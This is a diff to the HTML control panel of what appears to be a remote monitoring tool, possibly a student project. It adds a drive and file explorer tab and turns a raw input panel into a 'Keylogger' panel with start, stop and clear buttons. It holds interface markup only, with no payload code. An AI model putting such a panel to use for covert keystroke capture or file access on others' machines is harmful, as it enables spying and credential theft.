@@ -101,6 +101,13 @@
           <a
             href="#"
             class="list-group-item"
+            onclick="switchTab('files', this); getDrives();"
+          >
+            <i class="fas fa-folder-open"></i> File Manager
+          </a>
+          <a
+            href="#"
+            class="list-group-item"
             onclick="switchTab('terminal', this)"
           >
             <i class="fas fa-terminal"></i> Terminal Logs
@@ -304,6 +311,7 @@
             </div>
           </div>
         </div>
+
         <div id="tab-webcam" class="tab-content">
           <div class="card-custom">
             <div class="card-header-custom">
@@ -403,6 +411,53 @@
           </div>
         </div>
 
+        <div id="tab-files" class="tab-content">
+          <div class="card-custom h-100">
+            <div class="card-header-custom">
+              <span
+                ><i class="fas fa-folder-open text-warning"></i> File
+                Explorer</span
+              >
+              <div class="d-flex align-items-center">
+                <span
+                  id="current-path"
+                  class="me-3 fw-bold text-secondary small"
+                  >My Computer</span
+                >
+                <button class="btn btn-primary btn-sm" onclick="getDrives()">
+                  <i class="fas fa-home"></i> Home
+                </button>
+              </div>
+            </div>
+
+            <div
+              class="table-responsive p-0"
+              style="height: 500px; overflow-y: auto"
+            >
+              <table
+                class="table table-hover table-custom mb-0"
+                id="file-table"
+              >
+                <thead class="sticky-top bg-white shadow-sm">
+                  <tr>
+                    <th style="width: 50px" class="text-center">Type</th>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th style="width: 120px" class="text-center">Action</th>
+                  </tr>
+                </thead>
+                <tbody id="file-list-body">
+                  <tr>
+                    <td colspan="4" class="text-center text-muted">
+                      Select a drive to start...
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
         <div id="tab-processes" class="tab-content">
           <div class="card-custom">
             <div class="card-header-custom">
@@ -452,12 +507,6 @@
               <div class="card-custom h-100 d-flex flex-column">
                 <div class="card-header-custom small-header">
                   <span><i class="fas fa-history"></i> System Log</span>
-                  <button
-                    onclick="document.getElementById('terminal-output').innerText = ''"
-                    class="btn btn-sm btn-light border"
-                  >
-                    Clear
-                  </button>
                 </div>
                 <div
                   id="terminal-output"
@@ -472,14 +521,33 @@
               <div class="card-custom h-100 d-flex flex-column">
                 <div class="card-header-custom small-header">
                   <span class="text-danger"
-                    ><i class="fas fa-microchip"></i> Raw Input</span
+                    ><i class="fas fa-keyboard"></i> Keylogger</span
                   >
-                  <button
-                    onclick="document.getElementById('raw-key-output').innerHTML = ''"
-                    class="btn btn-sm btn-light border"
-                  >
-                    Clear
-                  </button>
+                  <div>
+                    <button
+                      onclick="sendCommand('START_KEYLOG')"
+                      class="btn btn-success btn-sm me-1"
+                      title="Bắt đầu ghi"
+                      style="padding: 2px 8px"
+                    >
+                      <i class="fas fa-play"></i>
+                    </button>
+                    <button
+                      onclick="sendCommand('STOP_KEYLOG')"
+                      class="btn btn-secondary btn-sm me-1"
+                      title="Dừng ghi"
+                      style="padding: 2px 8px"
+                    >
+                      <i class="fas fa-stop"></i>
+                    </button>
+                    <button
+                      onclick="clearAllKeylogs()"
+                      class="btn btn-sm btn-light border"
+                      title="Xóa tất cả dữ liệu"
+                    >
+                      Clear
+                    </button>
+                  </div>
                 </div>
                 <div
                   id="raw-key-output"
